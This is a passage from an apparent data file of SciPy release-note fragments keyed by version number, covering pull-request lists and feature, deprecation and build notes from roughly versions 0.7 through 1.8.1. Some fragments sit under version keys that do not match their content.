`4676 <https://github.com/scipy/scipy/pull/4676>`__: Added missing colon to :math: directive in docstring.\n- `4679 <https://github.com/scipy/scipy/pull/4679>`__: ENH: sparse randn\n- `4682 <https://github.com/scipy/scipy/pull/4682>`__: ENH: scipy.signal - Addition of CSD, coherence; Enhancement of...\n- `4684 <https://github.com/scipy/scipy/pull/4684>`__: BUG: various errors in weight calculations in orthogonal.py\n- `4685 <https://github.com/scipy/scipy/pull/4685>`__: BUG: Fixes #4594: optimize.linprog IndexError when a callback...\n- `4686 <https://github.com/scipy/scipy/pull/4686>`__: MAINT: cluster: Clean up duplicated exception raising code.\n- `4688 <https://github.com/scipy/scipy/pull/4688>`__: Improve is_distance_dm exception message\n- `4692 <https://github.com/scipy/scipy/pull/4692>`__: MAINT: stats: Simplify the calculation in tukeylambda._ppf\n- `4693 <https://github.com/scipy/scipy/pull/4693>`__: ENH: added functionality to handle scalars in `stats._chk_asarray`\n- `4694 <https://github.com/scipy/scipy/pull/4694>`__: Vectorization of Anderson-Darling computations.\n- `4696 <https://github.com/scipy/scipy/pull/4696>`__: Fix singleton expansion in lfilter.\n- `4698 <https://github.com/scipy/scipy/pull/4698>`__: MAINT: quiet warnings from cephes.\n- `4701 <https://github.com/scipy/scipy/pull/4701>`__: add Bpoly.antiderivatives / integrals\n- `4703 <https://github.com/scipy/scipy/pull/4703>`__: Add citation of published paper\n- `4706 <https://github.com/scipy/scipy/pull/4706>`__: MAINT: special: avoid out-of-bounds access in specfun\n- `4707 <https://github.com/scipy/scipy/pull/4707>`__: MAINT: fix issues with np.matrix as input to functions related...\n- `4709 <https://github.com/scipy/scipy/pull/4709>`__: ENH: `scipy.stats` now returns namedtuples.\n- `4710 <https://github.com/scipy/scipy/pull/4710>`__: scipy.io.idl: make reader more robust to missing variables in...\n- `4711 <https://github.com/scipy/scipy/pull/4711>`__: Fix crash for unknown chunks at the end of file\n- `4712 <https://github.com/scipy/scipy/pull/4712>`__: Reduce onenormest memory usage\n- `4713 <https://github.com/scipy/scipy/pull/4713>`__: MAINT: interpolate: no need to pass dtype around if it can be...\n- `4714 <https://github.com/scipy/scipy/pull/4714>`__: BENCH: Add benchmarks for stats module\n- `4715 <https://github.com/scipy/scipy/pull/4715>`__: MAINT: polish signal.place_poles and signal/test_ltisys.py\n- `4716 <https://github.com/scipy/scipy/pull/4716>`__: DEP: deprecate mstats.signaltonoise ...\n- `4717 <https://github.com/scipy/scipy/pull/4717>`__: MAINT: basinhopping: fix error in tests, silence /0 warning,...\n- `4718 <https://github.com/scipy/scipy/pull/4718>`__: ENH: stats: can specify f-shapes to fix in fitting by name\n- `4721 <https://github.com/scipy/scipy/pull/4721>`__: Document that imresize converts the input to a PIL image\n- `4722 <https://github.com/scipy/scipy/pull/4722>`__: MAINT: PyArray_BASE is not an lvalue unless the deprecated API...\n- `4725 <https://github.com/scipy/scipy/pull/4725>`__: Fix gengamma _nump failure\n- `4728 <https://github.com/scipy/scipy/pull/4728>`__: DOC: add poch to the list of scipy special function descriptions\n- `4735 <https://github.com/scipy/scipy/pull/4735>`__: MAINT: stats: avoid (a spurious) division-by-zero in skew\n- `4738 <https://github.com/scipy/scipy/pull/4738>`__: TST: silence runtime warnings for some corner cases in `stats`...\n- `4739 <https://github.com/scipy/scipy/pull/4739>`__: BLD: try to build numpy instead of using the one on TravisCI\n- `4740 <https://github.com/scipy/scipy/pull/4740>`__: DOC: Update some docstrings with 'versionadded'.\n- `4742 <https://github.com/scipy/scipy/pull/4742>`__: BLD: make sure that relaxed strides checking is in effect on...\n- `4750 <https://github.com/scipy/scipy/pull/4750>`__: DOC: special: TeX typesetting of rel_entr, kl_div and pseudo_huber\n- `4751 <https://github.com/scipy/scipy/pull/4751>`__: BENCH: add sparse null slice benchmark\n- `4753 <https://github.com/scipy/scipy/pull/4753>`__: BUG: Fixed compilation with recent Cython versions.\n- `4756 <https://github.com/scipy/scipy/pull/4756>`__: BUG: Fixes #4733: optimize.brute finish option is not compatible...\n- `4758 <https://github.com/scipy/scipy/pull/4758>`__: DOC: optimize.leastsq default maxfev clarification\n- `4759 <https://github.com/scipy/scipy/pull/4759>`__: improved stats mle fit\n- `4760 <https://github.com/scipy/scipy/pull/4760>`__: MAINT: count bfgs updates more carefully\n- `4762 <https://github.com/scipy/scipy/pull/4762>`__: BUGS: Fixes #4746 and 4594: linprog returns solution violating...\n- `4763 <https://github.com/scipy/scipy/pull/4763>`__: fix small linprog bugs\n- `4766 <https://github.com/scipy/scipy/pull/4766>`__: BENCH: add signal.lsim benchmark\n- `4768 <https://github.com/scipy/scipy/pull/4768>`__: fix python syntax errors in docstring examples\n- `4769 <https://github.com/scipy/scipy/pull/4769>`__: Fixes #4726: test_cobyla.test_vector_constraints\n- `4770 <https://github.com/scipy/scipy/pull/4770>`__: Mark FITPACK functions as thread safe.\n- `4771 <https://github.com/scipy/scipy/pull/4771>`__: edited scipy/stats/stats.py to fix doctest for fisher_exact\n- `4773 <https://github.com/scipy/scipy/pull/4773>`__: DOC: update 0.16.0 release notes.\n- `4775 <https://github.com/scipy/scipy/pull/4775>`__: DOC: linalg: add funm_psd as a docstring example\n- `4778 <https://github.com/scipy/scipy/pull/4778>`__: Use a dictionary for function name synonyms\n- `4780 <https://github.com/scipy/scipy/pull/4780>`__: Include apparently-forgotten functions in docs\n- `4783 <https://github.com/scipy/scipy/pull/4783>`__: Added many missing special functions to docs\n- `4784 <https://github.com/scipy/scipy/pull/4784>`__: add an axis attribute to PPoly and friends\n- `4785 <https://github.com/scipy/scipy/pull/4785>`__: Brief note about origin of Lena image\n- `4786 <https://github.com/scipy/scipy/pull/4786>`__: DOC: reformat the Methods section of the KDE docstring\n- `4787 <https://github.com/scipy/scipy/pull/4787>`__: Add rice cdf and ppf.\n- `4792 <https://github.com/scipy/scipy/pull/4792>`__: CI: add a kludge for detecting test failures which try to disguise...\n- `4795 <https://github.com/scipy/scipy/pull/4795>`__: Make refguide_check smarter about false positives\n- `4797 <https://github.com/scipy/scipy/pull/4797>`__: BUG/TST: numpoints not updated for incremental Voronoi\n- `4799 <https://github.com/scipy/scipy/pull/4799>`__: BUG: spatial: Fix a couple edge cases for the Mahalanobis metric...\n- `4801 <https://github.com/scipy/scipy/pull/4801>`__: BUG: Fix TypeError in scipy.optimize._trust-region.py when disp=True.\n- `4803 <https://github.com/scipy/scipy/pull/4803>`__: Issues with relaxed strides in QR updating routines\n- `4806 <https://github.com/scipy/scipy/pull/4806>`__: MAINT: use an informed initial guess for cauchy fit\n- `4810 <https://github.com/scipy/scipy/pull/4810>`__: PEP8ify codata.py\n- `4812 <https://github.com/scipy/scipy/pull/4812>`__: BUG: Relaxed strides cleanup in decomp_update.pyx.in\n- `4820 <https://github.com/scipy/scipy/pull/4820>`__: BLD: update Bento build for sgemv fix and install cython blas/lapack...\n- `4823 <https://github.com/scipy/scipy/pull/4823>`__: ENH: scipy.signal - Addition of spectrogram function\n- `4827 <https://github.com/scipy/scipy/pull/4827>`__: DOC: add csd and coherence to __init__.py\n- `4833 <https://github.com/scipy/scipy/pull/4833>`__: BLD: fix issue in linalg ``*lange`` wrappers for g77 builds.\n- `4841 <https://github.com/scipy/scipy/pull/4841>`__: TST: fix test failures in scipy.special with mingw32 due to test...\n- `4842 <https://github.com/scipy/scipy/pull/4842>`__: DOC: update site.cfg.example. Mostly taken over from Numpy\n- `4845 <https://github.com/scipy/scipy/pull/4845>`__: BUG: signal: Make spectrogram's return values order match the...\n- `4849 <https://github.com/scipy/scipy/pull/4849>`__: DOC:Fix error in ode docstring example\n- `4856 <https://github.com/scipy/scipy/pull/4856>`__: BUG: fix typo causing memleak\n\n\n==========================\n", "1.8.1": "-----------------------\n\n* `15167 <https://github.com/scipy/scipy/pull/15167>`__: CI: make sure CI stays on VS2019 unless changed explicitly\n* `15306 <https://github.com/scipy/scipy/pull/15306>`__: Revert \"BLD Respect the --skip-build flag in setup.py\"\n* `15504 <https://github.com/scipy/scipy/pull/15504>`__: MAINT: np.all(lb == ub) for optimize.minimize\n* `15530 <https://github.com/scipy/scipy/pull/15530>`__: REL: prep for SciPy 1.8.1\n* `15531 <https://github.com/scipy/scipy/pull/15531>`__: [BUG] Fix importing scipy.lib._pep440\n* `15558 <https://github.com/scipy/scipy/pull/15558>`__: CI: re-enable Pythran in Azure Windows CI jobs\n* `15566 <https://github.com/scipy/scipy/pull/15566>`__: BUG: fix error message\n* `15580 <https://github.com/scipy/scipy/pull/15580>`__: BUG: Avoid C Preprocessor symbol in _hypotests_pythran.py.\n* `15614 <https://github.com/scipy/scipy/pull/15614>`__: REL: filter out  in authors name and add count\n* `15637 <https://github.com/scipy/scipy/pull/15637>`__: DOC, MAINT: fix links to wrapped functions and SciPy's distributions\n* `15669 <https://github.com/scipy/scipy/pull/15669>`__: BUG: stats: fix a bug in UNU.RAN error handler\n* `15691 <https://github.com/scipy/scipy/pull/15691>`__: MAINT: stats: bootstrap: fix bug with \\`method=\"BCa\"\\` when \\`statistic\\`...\n* `15798 <https://github.com/scipy/scipy/pull/15798>`__: MAINT,BUG: stats: update to UNU.RAN 1.9.0\n* `15870 <https://github.com/scipy/scipy/pull/15870>`__: TST: signal: Convert a test with 'assert_array_less' to 'less...\n* `15910 <https://github.com/scipy/scipy/pull/15910>`__: make sure CI stays on VS2019 unless changed explicitly\n* `15926 <https://github.com/scipy/scipy/pull/15926>`__: MAINT: 1.8.1 backports/prep\n* `16035 <https://github.com/scipy/scipy/pull/16035>`__: BUG: allow scalar input to the \\`.dot\\` method of sparse matrices\n* `16041 <https://github.com/scipy/scipy/pull/16041>`__: MAINT: add include dir explicitly for PROPACK to build with classic...\n* `16139 <https://github.com/scipy/scipy/pull/16139>`__: WIP, BLD, MAINT: git security/version shim\n* `16152 <https://github.com/scipy/scipy/pull/16152>`__: TST: Fortify invalid-value warning filters to small changes in...\n* `16155 <https://github.com/scipy/scipy/pull/16155>`__: MAINT: correct wrong license of Biasedurn\n* `16158 <https://github.com/scipy/scipy/pull/16158>`__: MAINT: better UNU.RAN licensing information\n* `16163 <https://github.com/scipy/scipy/pull/16163>`__: MAINT: update UNU.RAN copyright information\n* `16172 <https://github.com/scipy/scipy/pull/16172>`__: CI: pin Pip to 22.0.4 to avoid issues with \\`--no-build-isolation\\`\n* `16175 <https://github.com/scipy/scipy/pull/16175>`__: TST: fix test failure due to changes in numpy scalar behavior.\n\n\n\n=========================\n", "0.7.0": "\n* weave test failures on windows: those are known, and are being revised.\n* weave test failure with gcc 4.3 (std::labs): this is a gcc 4.3 bug. A\n  workaround is to add include <cstdlib> in\n  scipy/weave/blitz/blitz/funcs.h (line 27). You can make the change in\n  the installed scipy (in site-packages).\n\n\n=========================\n", "1.3": "support for SciPy 0.7 will be addressed in a bug-fix release.\n\nPython 3.0 is not supported at all; it requires NumPy to be ported to\nPython 3.0.  This requires immense effort, since a lot of C code has\nto be ported.  The transition to 3.0 is still under consideration;\ncurrently, we don't have any timeline or roadmap for this transition.\n\nMajor documentation improvements\n================================\n\nSciPy documentation is greatly improved; you can view a HTML reference\nmanual `online <https://docs.scipy.org/>`__ or download it as a PDF\nfile. The new reference guide was built using the popular `Sphinx tool\n<http://www.sphinx-doc.org>`__.\n\nThis release also includes an updated tutorial, which hadn't been\navailable since SciPy was ported to NumPy in 2005.  Though not\ncomprehensive, the tutorial shows how to use several essential parts\nof Scipy.  It also includes the ``ndimage`` documentation from the\n``numarray`` manual.\n\nNevertheless, more effort is needed on the documentation front.\nLuckily, contributing to Scipy documentation is now easier than\nbefore: if you find that a part of it requires improvements, and want\nto help us out, please register a user name in our web-based\ndocumentation editor at https://docs.scipy.org/ and correct the issues.\n\nRunning Tests\n=============\n\nNumPy 1.2 introduced a new testing framework based on `nose\n<http://somethingaboutorange.com/mrl/projects/nose/>`__.  Starting with\nthis release, SciPy now uses the new NumPy test framework as well.\nTaking advantage of the new testing framework requires ``nose``\n", "0.10": "that it greatly simplifies writing unit tests - which has all ready\npaid off, given the rapid increase in tests.  To run the full test\nsuite::\n\n    >>> import scipy\n    >>> scipy.test('full')\n\nFor more information, please see `The NumPy/SciPy Testing Guide\n<https://github.com/numpy/numpy/blob/main/doc/TESTS.rst.txt>`__.\n\nWe have also greatly improved our test coverage.  There were just over\n2,000 unit tests in the 0.6.0 release; this release nearly doubles\nthat number, with just over 4,000 unit tests.\n\nBuilding SciPy\n==============\n\nSupport for NumScons has been added. NumScons is a tentative new build\nsystem for NumPy/SciPy, using `SCons <https://www.scons.org/>`__ at its\ncore.\n\nSCons is a next-generation build system, intended to replace the\nvenerable ``Make`` with the integrated functionality of\n``autoconf``/``automake`` and ``ccache``.  Scons is written in Python\nand its configuration files are Python scripts.  NumScons is meant to\nreplace NumPy's custom version of ``distutils`` providing more\nadvanced functionality, such as ``autoconf``, improved fortran\nsupport, more tools, and support for ``numpy.distutils``/``scons``\ncooperation.\n\nSandbox Removed\n===============\n\nWhile porting SciPy to NumPy in 2005, several packages and modules\nwere moved into ``scipy.sandbox``.  The sandbox was a staging ground\nfor packages that were undergoing rapid development and whose APIs\nwere in flux.  It was also a place where broken code could live.  The\nsandbox has served its purpose well, but was starting to create\nconfusion.  Thus ``scipy.sandbox`` was removed.  Most of the code was\nmoved into ``scipy``, some code was made into a ``scikit``, and the\nremaining code was just deleted, as the functionality had been\nreplaced by other code.\n\nSparse Matrices\n===============\n\nSparse matrices have seen extensive improvements.  There is now\nsupport for integer dtypes such ``int8``, ``uint32``, etc.  Two new\nsparse formats were added:\n\n* new class ``dia_matrix`` : the sparse DIAgonal format\n* new class ``bsr_matrix`` : the Block CSR format\n\nSeveral new sparse matrix construction functions were added:\n\n* ``sparse.kron`` : sparse Kronecker product\n* ``sparse.bmat`` : sparse version of ``numpy.bmat``\n* ``sparse.vstack`` : sparse version of ``numpy.vstack``\n* ``sparse.hstack`` : sparse version of ``numpy.hstack``\n\nExtraction of submatrices and nonzero values have been added:\n\n* ``sparse.tril`` : extract lower triangle\n* ``sparse.triu`` : extract upper triangle\n* ``sparse.find`` : nonzero values and their indices\n\n``csr_matrix`` and ``csc_matrix`` now support slicing and fancy\nindexing (e.g., ``A[1:3, 4:7]`` and ``A[[3,2,6,8],:]``).  Conversions\namong all sparse formats are now possible:\n\n* using member functions such as ``.tocsr()`` and ``.tolil()``\n* using the ``.asformat()`` member function, e.g. ``A.asformat('csr')``\n* using constructors ``A = lil_matrix([[1,2]]); B = csr_matrix(A)``\n\nAll sparse constructors now accept dense matrices and lists of lists.\nFor example:\n\n* ``A = csr_matrix( rand(3,3) )`` and ``B = lil_matrix( [[1,2],[3,4]] )``\n\nThe handling of diagonals in the ``spdiags`` function has been changed.\nIt now agrees with the MATLAB(TM) function of the same name.\n  \nNumerous efficiency improvements to format conversions and sparse\nmatrix arithmetic have been made.  Finally, this release contains\nnumerous bugfixes.\n\nStatistics package\n==================\n\nStatistical functions for masked arrays have been added, and are\naccessible through ``scipy.stats.mstats``. The functions are similar\nto their counterparts in ``scipy.stats`` but they have not yet been\nverified for identical interfaces and algorithms.\n\nSeveral bugs were fixed for statistical functions, of those,\n``kstest`` and ``percentileofscore`` gained new keyword arguments.\n\nAdded deprecation warning for ``mean``, ``median``, ``var``, ``std``,\n``cov``, and ``corrcoef``. These functions should be replaced by their\nnumpy counterparts.  Note, however, that some of the default options\ndiffer between the ``scipy.stats`` and numpy versions of these\nfunctions.\n\nNumerous bug fixes to ``stats.distributions``: all generic methods now\nwork correctly, several methods in individual distributions were\ncorrected. However, a few issues remain with higher moments (``skew``,\n``kurtosis``) and entropy.  The maximum likelihood estimator, ``fit``,\ndoes not work out-of-the-box for some distributions - in some cases,\nstarting values have to be carefully chosen, in other cases, the\ngeneric implementation of the maximum likelihood method might not be\nthe numerically appropriate estimation method.\n\nWe expect more bugfixes, increases in numerical precision and\nenhancements in the next release of scipy.\n\nReworking of IO package\n=======================\n\nThe IO code in both NumPy and SciPy is being extensively\nreworked. NumPy will be where basic code for reading and writing NumPy\narrays is located, while SciPy will house file readers and writers for\nvarious data formats (data, audio, video, images, matlab, etc.).\n\nSeveral functions in ``scipy.io`` have been deprecated and will be\nremoved in the 0.8.0 release including ``npfile``, ``save``, ``load``,\n``create_module``, ``create_shelf``, ``objload``, ``objsave``,\n``fopen``, ``read_array``, ``write_array``, ``fread``, ``fwrite``,\n``bswap``, ``packbits``, ``unpackbits``, and ``convert_objectarray``.\nSome of these functions have been replaced by NumPy's raw reading and\nwriting capabilities, memory-mapping capabilities, or array methods.\nOthers have been moved from SciPy to NumPy, since basic array reading\nand writing capability is now handled by NumPy.\n\nThe Matlab (TM) file readers/writers have a number of improvements:\n\n* default version 5\n* v5 writers for structures, cell arrays, and objects\n* v5 readers/writers for function handles and 64-bit integers\n* new struct_as_record keyword argument to ``loadmat``, which loads\n  struct arrays in matlab as record arrays in numpy\n* string arrays have ``dtype='U...'`` instead of ``dtype=object``\n* ``loadmat`` no longer squeezes singleton dimensions, i.e.\n  ``squeeze_me=False`` by default\n\nNew Hierarchical Clustering module\n==================================\n\nThis module adds new hierarchical clustering functionality to the\n``scipy.cluster`` package. The function interfaces are similar to the\nfunctions provided MATLAB(TM)'s Statistics Toolbox to help facilitate\neasier migration to the NumPy/SciPy framework. Linkage methods\nimplemented include single, complete, average, weighted, centroid,\nmedian, and ward.\n\nIn addition, several functions are provided for computing\ninconsistency statistics, cophenetic distance, and maximum distance\nbetween descendants. The ``fcluster`` and ``fclusterdata`` functions\ntransform a hierarchical clustering into a set of flat clusters. Since\nthese flat clusters are generated by cutting the tree into a forest of\ntrees, the ``leaders`` function takes a linkage and a flat clustering,\nand finds the root of each tree in the forest. The ``ClusterNode``\nclass represents a hierarchical clusterings as a field-navigable tree\nobject. ``to_tree`` converts a matrix-encoded hierarchical clustering\nto a ``ClusterNode`` object. Routines for converting between MATLAB\nand SciPy linkage encodings are provided. Finally, a ``dendrogram``\nfunction plots hierarchical clusterings as a dendrogram, using\nmatplotlib.\n\nNew Spatial package\n===================\n\nThe new spatial package contains a collection of spatial algorithms\nand data structures, useful for spatial statistics and clustering\napplications. It includes rapidly compiled code for computing exact\nand approximate nearest neighbors, as well as a pure-python kd-tree\nwith the same interface, but that supports annotation and a variety of\nother algorithms. The API for both modules may change somewhat, as\nuser requirements become clearer.\n\nIt also includes a ``distance`` module, containing a collection of\ndistance and dissimilarity functions for computing distances between\nvectors, which is useful for spatial statistics, clustering, and\nkd-trees.  Distance and dissimilarity functions provided include\nBray-Curtis, Canberra, Chebyshev, City Block, Cosine, Dice, Euclidean,\nHamming, Jaccard, Kulsinski, Mahalanobis, Matching, Minkowski,\nRogers-Tanimoto, Russell-Rao, Squared Euclidean, Standardized\nEuclidean, Sokal-Michener, Sokal-Sneath, and Yule.\n\nThe ``pdist`` function computes pairwise distance between all\nunordered pairs of vectors in a set of vectors. The ``cdist`` computes\nthe distance on all pairs of vectors in the Cartesian product of two\nsets of vectors.  Pairwise distance matrices are stored in condensed\nform; only the upper triangular is stored. ``squareform`` converts\ndistance matrices between square and condensed forms.\n\nReworked fftpack package\n========================\n\nFFTW2, FFTW3, MKL and DJBFFT wrappers have been removed. Only (NETLIB)\nfftpack remains. By focusing on one backend, we hope to add new\nfeatures - like float32 support - more easily.\n\nNew Constants package\n=====================\n\n``scipy.constants`` provides a collection of physical constants and\nconversion factors.  These constants are taken from CODATA Recommended\nValues of the Fundamental Physical Constants: 2002. They may be found\nat physics.nist.gov/constants. The values are stored in the dictionary\nphysical_constants as a tuple containing the value, the units, and the\nrelative precision - in that order. All constants are in SI units,\nunless otherwise stated.  Several helper functions are provided.\n\nNew Radial Basis Function module\n================================\n\n``scipy.interpolate`` now contains a Radial Basis Function module.\nRadial basis functions can be used for smoothing/interpolating\nscattered data in n-dimensions, but should be used with caution for\nextrapolation outside of the observed data range.\n\nNew complex ODE integrator\n==========================\n\n``scipy.integrate.ode`` now contains a wrapper for the ZVODE\ncomplex-valued ordinary differential equation solver (by Peter\nN. Brown, Alan C. Hindmarsh, and George D. Byrne).\n\nNew generalized symmetric and hermitian eigenvalue problem solver\n=================================================================\n\n``scipy.linalg.eigh`` now contains wrappers for more LAPACK symmetric\nand hermitian eigenvalue problem solvers. Users can now solve\ngeneralized problems, select a range of eigenvalues only, and choose\nto use a faster algorithm at the expense of increased memory\nusage. The signature of the ``scipy.linalg.eigh`` changed accordingly.\n\nBug fixes in the interpolation package\n======================================\n\nThe shape of return values from ``scipy.interpolate.interp1d`` used to\nbe incorrect, if interpolated data had more than 2 dimensions and the\naxis keyword was set to a non-default value. This has been fixed.\nMoreover, ``interp1d`` returns now a scalar (0D-array) if the input\nis a scalar. Users of ``scipy.interpolate.interp1d`` may need to\nrevise their code if it relies on the previous behavior.\n\nWeave clean up\n==============\n\nThere were numerous improvements to ``scipy.weave``.  ``blitz++`` was\nrelicensed by the author to be compatible with the SciPy license.\n``wx_spec.py`` was removed.\n\nKnown problems\n==============\n\n", "0.9.0": "many new features, numerous bug-fixes, improved test coverage and\nbetter documentation.  There have been a number of deprecations and\nAPI changes in this release, which are documented below.  All users\nare encouraged to upgrade to this release, as there are a large number\nof bug-fixes and optimizations.  Moreover, our development attention\nwill now shift to bug-fix releases on the 0.9.x branch, and on adding\nnew features on the development trunk.\n\nThis release requires Python 2.4 - 2.7 or 3.1 - and NumPy 1.5 or greater.\n\nPlease note that SciPy is still considered to have \"Beta\" status, as\nwe work toward a SciPy 1.0.0 release.  The 1.0.0 release will mark a\nmajor milestone in the development of SciPy, after which changing the\npackage structure or API will be much more difficult.  Whilst these\npre-1.0 releases are considered to have \"Beta\" status, we are\ncommitted to making them as bug-free as possible.\n\nHowever, until the 1.0 release, we are aggressively reviewing and\nrefining the functionality, organization, and interface. This is being\ndone in an effort to make the package as coherent, intuitive, and\nuseful as possible.  To achieve this, we need help from the community\nof users.  Specifically, we need feedback regarding all aspects of the\nproject - everything - from which algorithms we implement, to details\nabout our function's call signatures.\n\n\nPython 3\n========\n\nScipy 0.9.0 is the first SciPy release to support Python 3. The only module\nthat is not yet ported is ``scipy.weave``.\n\n\nScipy source code location to be changed\n========================================\n\nSoon after this release, Scipy will stop using SVN as the version control\nsystem, and move to Git. The development source code for Scipy can from then on\nbe found at\n\n    https://github.com/scipy/scipy\n\n\nNew features\n============\n\nDelaunay tessellations (``scipy.spatial``)\n------------------------------------------\n\nScipy now includes routines for computing Delaunay tessellations in N\ndimensions, powered by the Qhull_ computational geometry library. Such\ncalculations can now make use of the new ``scipy.spatial.Delaunay``\ninterface.\n\n.. _Qhull: http://www.qhull.org/\n\nN-dimensional interpolation (``scipy.interpolate``)\n---------------------------------------------------\n\nSupport for scattered data interpolation is now significantly\nimproved.  This version includes a ``scipy.interpolate.griddata``\nfunction that can perform linear and nearest-neighbour interpolation\nfor N-dimensional scattered data, in addition to cubic spline\n(C1-smooth) interpolation in 2D and 1D.  An object-oriented interface\nto each interpolator type is also available.\n\nNonlinear equation solvers (``scipy.optimize``)\n-----------------------------------------------\n\nScipy includes new routines for large-scale nonlinear equation solving\nin ``scipy.optimize``.  The following methods are implemented:\n\n* Newton-Krylov (``scipy.optimize.newton_krylov``)\n\n* (Generalized) secant methods:\n\n  - Limited-memory Broyden methods (``scipy.optimize.broyden1``,\n    ``scipy.optimize.broyden2``)\n\n  - Anderson method (``scipy.optimize.anderson``)\n\n* Simple iterations (``scipy.optimize.diagbroyden``,\n  ``scipy.optimize.excitingmixing``, ``scipy.optimize.linearmixing``)\n\nThe ``scipy.optimize.nonlin`` module was completely rewritten, and\nsome of the functions were deprecated (see above).\n\n\nNew linear algebra routines (``scipy.linalg``)\n----------------------------------------------\n\nScipy now contains routines for effectively solving triangular\nequation systems (``scipy.linalg.solve_triangular``).\n\n\nImproved FIR filter design functions (``scipy.signal``)\n-------------------------------------------------------\n\nThe function ``scipy.signal.firwin`` was enhanced to allow the\ndesign of highpass, bandpass, bandstop and multi-band FIR filters.\n\nThe function ``scipy.signal.firwin2`` was added.  This function\nuses the window method to create a linear phase FIR filter with\nan arbitrary frequency response.\n\nThe functions ``scipy.signal.kaiser_atten`` and ``scipy.signal.kaiser_beta``\nwere added.\n\n\nImproved statistical tests (``scipy.stats``)\n--------------------------------------------\n\nA new function ``scipy.stats.fisher_exact`` was added, that provides Fisher's\nexact test for 2x2 contingency tables.\n\nThe function ``scipy.stats.kendalltau`` was rewritten to make it much faster\n(O(n log(n)) vs O(n^2)).\n\n\nDeprecated features\n===================\n\nObsolete nonlinear solvers (in ``scipy.optimize``)\n--------------------------------------------------\n\nThe following nonlinear solvers from ``scipy.optimize`` are\ndeprecated:\n\n- ``broyden_modified`` (bad performance)\n- ``broyden1_modified`` (bad performance)\n- ``broyden_generalized`` (equivalent to ``anderson``)\n- ``anderson2`` (equivalent to ``anderson``)\n- ``broyden3`` (obsoleted by new limited-memory broyden methods)\n- ``vackar`` (renamed to ``diagbroyden``)\n\n\nRemoved features\n================\n\nThe deprecated modules ``helpmod``, ``pexec`` and ``ppimport`` were removed\nfrom ``scipy.misc``.\n\nThe ``output_type`` keyword in many ``scipy.ndimage`` interpolation functions\nhas been removed.\n\nThe ``econ`` keyword in ``scipy.linalg.qr`` has been removed. The same\nfunctionality is still available by specifying ``mode='economic'``.\n\n\nOld correlate/convolve behavior (in ``scipy.signal``)\n-----------------------------------------------------\n\nThe old behavior for ``scipy.signal.convolve``, ``scipy.signal.convolve2d``,\n``scipy.signal.correlate`` and ``scipy.signal.correlate2d`` was deprecated in\n", "0.8.0": "many new features, numerous bug-fixes, improved test coverage and\nbetter documentation.  There have been a number of deprecations and\nAPI changes in this release, which are documented below.  All users\nare encouraged to upgrade to this release, as there are a large number\nof bug-fixes and optimizations.  Moreover, our development attention\nwill now shift to bug-fix releases on the 0.8.x branch, and on adding\nnew features on the development trunk.  This release requires Python\n2.4 - 2.6 and NumPy 1.4.1 or greater.\n\nPlease note that SciPy is still considered to have \"Beta\" status, as\nwe work toward a SciPy 1.0.0 release.  The 1.0.0 release will mark a\nmajor milestone in the development of SciPy, after which changing the\npackage structure or API will be much more difficult.  Whilst these\npre-1.0 releases are considered to have \"Beta\" status, we are\ncommitted to making them as bug-free as possible.\n\nHowever, until the 1.0 release, we are aggressively reviewing and\nrefining the functionality, organization, and interface. This is being\ndone in an effort to make the package as coherent, intuitive, and\nuseful as possible.  To achieve this, we need help from the community\nof users.  Specifically, we need feedback regarding all aspects of the\nproject - everything - from which algorithms we implement, to details\nabout our function's call signatures.\n\nPython 3\n========\n\nPython 3 compatibility is planned and is currently technically\nfeasible, since Numpy has been ported. However, since the Python 3\ncompatible Numpy 1.5 has not been released yet, support for Python 3\nin Scipy is not yet included in Scipy 0.8.  SciPy 0.9, planned for fall\n2010, will very likely include experimental support for Python 3.\n\nMajor documentation improvements\n================================\n\nSciPy documentation is greatly improved.\n\nDeprecated features\n===================\n\nSwapping inputs for correlation functions (scipy.signal)\n--------------------------------------------------------\n\nConcern correlate, correlate2d, convolve and convolve2d. If the second input is\nlarger than the first input, the inputs are swapped before calling the\nunderlying computation routine. This behavior is deprecated, and will be\nremoved in scipy 0.9.0.\n\nObsolete code deprecated (scipy.misc)\n-------------------------------------\n\nThe modules `helpmod`, `ppimport` and `pexec` from `scipy.misc` are deprecated.\nThey will be removed from SciPy in version 0.9.\n\nAdditional deprecations\n-----------------------\n\n* linalg: The function `solveh_banded` currently returns a tuple containing\n  the Cholesky factorization and the solution to the linear system.  In\n  SciPy 0.9, the return value will be just the solution.\n* The function `constants.codata.find` will generate a DeprecationWarning.\n  In Scipy version 0.8.0, the keyword argument 'disp' was added to the\n  function, with the default value 'True'.  In 0.9.0, the default will be\n  'False'.\n* The `qshape` keyword argument of `signal.chirp` is deprecated.  Use\n  the argument `vertex_zero` instead.\n* Passing the coefficients of a polynomial as the argument `f0` to\n  `signal.chirp` is deprecated.  Use the function `signal.sweep_poly`\n  instead.\n* The `io.recaster` module has been deprecated and will be removed in 0.9.0.\n\nNew features\n============\n\nDCT support (scipy.fftpack)\n---------------------------\n\nNew realtransforms have been added, namely dct and idct for Discrete Cosine\nTransform; type I, II and III are available.\n\nSingle precision support for fft functions (scipy.fftpack)\n----------------------------------------------------------\n\nfft functions can now handle single precision inputs as well: fft(x) will\nreturn a single precision array if x is single precision.\n\nAt the moment, for FFT sizes that are not composites of 2, 3, and 5, the\ntransform is computed internally in double precision to avoid rounding error in\nFFTPACK.\n\nCorrelation functions now implement the usual definition (scipy.signal)\n-----------------------------------------------------------------------\n\nThe outputs should now correspond to their matlab and R counterparts, and do\nwhat most people expect if the old_behavior=False argument is passed:\n\n* correlate, convolve and their 2d counterparts do not swap their inputs\n  depending on their relative shape anymore;\n* correlation functions now conjugate their second argument while computing\n  the slided sum-products, which correspond to the usual definition of\n  correlation.\n\nAdditions and modification to LTI functions (scipy.signal)\n----------------------------------------------------------\n\n* The functions `impulse2` and `step2` were added to `scipy.signal`.\n  They use the function `scipy.signal.lsim2` to compute the impulse and\n  step response of a system, respectively.\n* The function `scipy.signal.lsim2` was changed to pass any additional\n  keyword arguments to the ODE solver.\n\nImproved waveform generators (scipy.signal)\n-------------------------------------------\n\nSeveral improvements to the `chirp` function in `scipy.signal` were made:\n\n* The waveform generated when `method=\"logarithmic\"` was corrected; it\n  now generates a waveform that is also known as an \"exponential\" or\n  \"geometric\" chirp. (See https://en.wikipedia.org/wiki/Chirp.)\n* A new `chirp` method, \"hyperbolic\", was added.\n* Instead of the keyword `qshape`, `chirp` now uses the keyword\n  `vertex_zero`, a boolean.\n* `chirp` no longer handles an arbitrary polynomial.  This functionality\n  has been moved to a new function, `sweep_poly`.\n\nA new function, `sweep_poly`, was added.\n\nNew functions and other changes in scipy.linalg\n-----------------------------------------------\n\nThe functions 